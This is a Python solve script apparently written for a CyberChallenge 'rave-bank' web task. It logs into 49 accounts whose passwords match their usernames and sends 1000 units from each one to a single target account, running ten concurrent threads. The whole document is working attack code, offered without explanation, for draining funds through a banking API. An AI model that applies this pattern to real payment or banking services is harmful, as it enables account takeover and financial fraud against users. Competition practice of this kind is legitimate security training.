import urllib.request, json, concurrent.futures

ROOT = 'http://rave-bank.level-up.2020.tasks.cyberchallenge.ru'

def xchg(path, data, token=None):
    headers = {'Content-Type': 'application/json'}
    if token != None: headers['Authorization'] = 'Bearer '+token
    req = urllib.request.Request(ROOT+path, data=json.dumps(data).encode('ascii') if data != None else None, headers=headers)
    try: return json.loads(urllib.request.urlopen(req).read().decode('ascii'))
    except urllib.error.URLError as e: return json.loads(e.read().decode('ascii'))

def api_login(username, password):
    return xchg('/api/auth/sign-in', {'username': username, 'password': password})['data']['access_token']

def api_me(token):
    return xchg('/api/user/me', None, token)['balances'][0]['id']

def api_search(username, token):
    return xchg('/api/user/search?username='+username, None, token)[0]['id']

def api_transfer(src, tgt, amount, token):
    return xchg('/api/balances/transfer', {'balanceId': src, 'targetId': tgt, 'amount': amount}, token)

if __name__ == '__main__':
    target = api_search('sleirs00', api_login('sleirs00', 'sleirs00'))
    def work(i):
        u = 'sleirs0'+str(i)
        token = api_login(u, u)
        src = api_me(token)
        print(api_transfer(src, target, 1000, token))
    list(concurrent.futures.ThreadPoolExecutor(10).map(work, range(1, 50)))
